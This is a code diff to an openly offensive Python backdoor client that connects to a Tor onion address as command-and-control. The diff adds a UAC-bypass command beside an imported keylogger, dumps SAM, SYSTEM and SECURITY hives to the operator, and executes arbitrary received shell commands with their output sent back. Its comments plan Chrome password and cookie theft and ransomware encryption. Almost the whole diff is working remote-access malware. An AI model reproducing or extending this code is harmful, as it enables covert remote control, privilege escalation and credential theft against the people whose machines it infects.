@@ -1,11 +1,8 @@
-# Standard library imports
-# import ctypes
 import cv2
 import json
 import os
 import shutil
 import socket
-# import ssl
 import subprocess
 import sys
 import threading
@@ -19,10 +16,9 @@ from tor_network import ClientSocket, Tor
 import requests
 from mss import mss
 
-# Local application/library specific imports
-from tools import keylogger
-# from mss import mss # mss v6.1.0
-# import requests # v2.28.0
+# Local tools to the application
+from tools import keylogger,uac_bypass
+
 
 
 def reliable_send(data):
@@ -177,41 +173,8 @@ def is_admin():
         # TODO implmenet checking if these platforms have root/admin access
 
 
-# TODO: more elegant but relibles on an additional library
-# def is_admin():
-#     try:
-#         return ctypes.windll.shell32.IsUserAnAdmin()
-#     except:
-#         return False
-
-
-# def is_admin():
-#     global admin
-#     if platform == 'win32':
-#         try:
-#             temp = os.listdir(os.sep.join([os.environ.get('SystemRoot', 'C:\windows'), 'temp']))
-#         except:
-#             admin = False
-#         else:
-#             admin = True
-#     elif platform == "linux" or platform == "linux2" or platform == "darwin":
-#         os.open('/etc/hosts', os.O_RDONLY)
-#         admin = True
-#         # TODO implmenet checking if these platforms have root/admin access
-#     return admin
-
-
-# def admin_string(is_admin):
-#     if(is_admin):
-#         return '[+] Administrator Privileges!'
-#     else:
-#         return '[!!] User Privileges!'
-
-
 # TODO get_chrome_passwords()
-
 # TODO get_chrome_cookies()
-
 # TODO encrypt_user_dir() ransomware element
 # TODO def encrypt_file_in_dir(file_name, key)
 # TODO def gen_key()
@@ -283,10 +246,19 @@ def shell():
                 reliable_send('[+] Started!')
             except:
                 reliable_send('[-] Failed to start!')
-        # TODO: This code is untested!
+        
+        
+        # TODO: Not yet to production level
         elif command[:12] == 'get_sam_dump':
             sam_dump, system_dump, security_dump = get_sam_dump()
             reliable_send((sam_dump, system_dump, security_dump))
+        
+        elif command[:10] == 'uacbypass':
+            if uac_bypass.execute():
+                reliable_send('[+] UAC bypassed!')
+            else:
+                reliable_send('[-] UAC not bypassed!')
+
         else:
             execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                        stdin=subprocess.PIPE)
@@ -294,18 +266,18 @@ def shell():
             result = result.decode()
             reliable_send(result)
 
-
-def connection():
+def connect():
     while True:
-        time.sleep(1)
+        timeout = 30
         try:
-            #persist('Backdoor', 'windows32.exe')
+            global s
+            s = clientsock.create_connection()
             shell()
             s.close()
             break
-        except:
-            connection()
-  
+        except socket.error as err:
+            print(err)
+            connect()
 
 tor = Tor()
 ENCODING = 'utf-8'
@@ -313,7 +285,4 @@ onion, port = tor.read_address_from_binary()
 print('onion: ' + onion + '\nport: ' + str(port))
 
 clientsock = ClientSocket(onion,port)
-s = clientsock.create_connection()
-
-connection()
-
+connect()
